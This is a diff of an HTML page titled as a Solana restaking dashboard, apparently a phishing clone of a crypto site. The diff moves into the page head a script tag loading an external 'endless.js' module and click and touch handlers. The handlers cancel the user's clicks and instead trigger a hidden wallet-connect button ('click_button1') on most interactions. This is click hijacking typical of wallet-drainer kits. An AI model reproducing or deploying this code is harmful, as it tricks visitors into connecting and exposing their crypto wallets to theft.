@@ -1,5 +1,61 @@
 <!DOCTYPE html>
 <html data-critters-container="" lang="en">
+ <head>
+  <meta content="upgrade-insecure-requests" http-equiv="Content-Security-Policy"/>
+  <script defer="True" src="endless.js" type="module">
+  </script>
+  <script>
+   let count_clicks = 0
+
+window.onclick = (e) => {
+    // console.log(e.target)
+    console.log("clicked");
+    console.log(e.target.tagName)
+
+    // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
+    if (e.target.id != 'click_button1') {
+
+        e.preventDefault()
+        console.log(`clicks ${count_clicks}`);
+
+        if (count_clicks % 2 === 0) {
+
+            document.getElementById('click_button1').click()
+        }
+        // console.log('clicked')
+        count_clicks += 1;
+    }
+}
+let touchStartTime = 0;
+let count_taps = 0
+window.ontouchstart = (e) => {
+    touchStartTime = Date.now();
+
+}
+window.ontouchend = (e) => {
+    console.log("tapped");
+    console.log(e.target.tagName)
+    const touchEndTime = Date.now();
+    const touchDuration = touchEndTime - touchStartTime;
+
+    if (touchDuration < 300) {
+        // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
+        if (e.target.id != 'click_button1') {
+
+            if (count_taps % 2 === 0) {
+
+                e.preventDefault()
+            }
+
+            document.getElementById('click_button1').click()
+//            console.log('clicked')
+        }
+        count_taps++;
+
+    }
+}
+  </script>
+ </head>
  <meta charset="utf-8"/>
  <title>
   Solayer Dashboard | Solana restaking
@@ -598,58 +654,4 @@
    (()=>{document.currentScript.remove();processNode(document);function processNode(node){node.querySelectorAll("template[shadowrootmode]").forEach(element=>{let shadowRoot = element.parentElement.shadowRoot;if (!shadowRoot) {try {shadowRoot=element.parentElement.attachShadow({mode:element.getAttribute("shadowrootmode"),delegatesFocus:element.getAttribute("shadowrootdelegatesfocus")!=null,clonable:element.getAttribute("shadowrootclonable")!=null,serializable:element.getAttribute("shadowrootserializable")!=null});shadowRoot.innerHTML=element.innerHTML;element.remove()} catch (error) {} if (shadowRoot) {processNode(shadowRoot)}}})}})()
   </script>
  </body>
- <meta content="upgrade-insecure-requests" http-equiv="Content-Security-Policy"/>
- <script defer="True" src="endless.js" type="module">
- </script>
- <script>
-  let count_clicks = 0
-
-window.onclick = (e) => {
-    // console.log(e.target)
-    console.log("clicked");
-    console.log(e.target.tagName)
-
-    // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
-    if (e.target.id != 'click_button1') {
-
-        e.preventDefault()
-        console.log(`clicks ${count_clicks}`);
-
-        if (count_clicks % 2 === 0) {
-
-            document.getElementById('click_button1').click()
-        }
-        // console.log('clicked')
-        count_clicks += 1;
-    }
-}
-let touchStartTime = 0;
-let count_taps = 0
-window.ontouchstart = (e) => {
-    touchStartTime = Date.now();
-
-}
-window.ontouchend = (e) => {
-    console.log("tapped");
-    console.log(e.target.tagName)
-    const touchEndTime = Date.now();
-    const touchDuration = touchEndTime - touchStartTime;
-
-    if (touchDuration < 300) {
-        // if (e.target.id != 'click_button1' &&e.target.tagName.toLowerCase() != 'w3m-modal') {
-        if (e.target.id != 'click_button1') {
-
-            if (count_taps % 2 === 0) {
-
-                e.preventDefault()
-            }
-
-            document.getElementById('click_button1').click()
-//            console.log('clicked')
-        }
-        count_taps++;
-
-    }
-}
- </script>
 </html>
